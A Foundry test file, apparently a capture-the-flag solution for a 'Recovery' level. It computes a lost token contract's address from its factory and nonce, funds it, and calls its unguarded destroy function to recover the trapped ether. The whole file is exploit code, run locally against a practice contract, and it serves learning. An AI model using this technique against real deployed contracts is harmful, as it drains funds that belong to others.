// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoveryTest is Test {
    Recovery recovery;
    address helper = makeAddr("helper");

    function setUp() public {
        recovery = new Recovery();
    }

    function testRecoverLostTokens() public {
        // 1. Fund the attacker wallet
        vm.deal(helper, 10 ether);
        vm.startPrank(helper);

        // 2. Create the hidden token contract (No value parameter here!)
        recovery.generateToken("Helper", 1000000);

        // 3. Compute the lost address using the RLP formula
        address lostContractAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),      // RLP list prefix
                            bytes1(0x94),      // RLP 20-byte address prefix
                            address(recovery), // The factory contract address
                            bytes1(0x01)       // Nonce = 1
                        )
                    )
                )
            )
        );

        // 4. Simulate the level creator sending 0.001 ether to the token contract
        // This triggers SimpleToken's receive() function
        (bool success, ) = lostContractAddress.call{value: 0.001 ether}("");
        require(success, "Funding lost contract failed");

        // Verify the money safely reached the target address
        assertEq(lostContractAddress.balance, 0.001 ether);

        // 5. Fire the exploit by calling destroy
        SimpleToken(payable(lostContractAddress)).destroy(payable(helper));

        // 6. Assert that helper received the trapped 0.001 ether back
        // 10 ether initial - 0.001 ether sent + 0.001 ether recovered = 10 ether
        assertEq(helper.balance, 10 ether);
        
        vm.stopPrank();
    }
}